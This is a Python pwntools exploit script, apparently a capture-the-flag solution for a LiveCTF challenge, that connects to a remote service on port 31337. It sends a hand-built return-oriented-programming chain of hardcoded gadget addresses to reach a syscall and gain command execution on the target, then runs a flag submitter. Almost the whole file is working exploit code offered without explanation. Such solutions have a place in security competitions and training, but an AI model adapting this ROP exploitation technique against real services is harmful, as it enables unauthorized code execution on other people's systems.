#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def write(num):
    sla(": ",str(num))
write(666)
write(666)
write(666)
write(400000666)
pop_rdi_rbp = "402218"
add_rax_rdi = "471885"
syscall = "401311"
'''
   0x469524 <__memchr_avx2+132>:	add    rdi,0x61
   0x469528 <__memchr_avx2+136>:	add    rax,rdi
   0x46952b <__memchr_avx2+139>:	vzeroupper 
   0x46952e <__memchr_avx2+142>:	ret   
'''
write(pop_rdi_rbp)
write("499778")
write("123")
for i in range(289):
    write("469524")
'''
0x0000000000402216 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000416775 : sub eax, esi ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
'''
write("402216")
write("53520449")
write("777")
write("777")
write("416775")
write("777")
write("777")
write("777")
write("777")


write("402216")
write("5")
write("777")
write("777")
write("416775")
write("777")
write("777")
write("777")
write("777")


write("402216")
write("400520")
write("3")
write("2")

write(syscall)

write("556")
write(0)

r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

r.close()
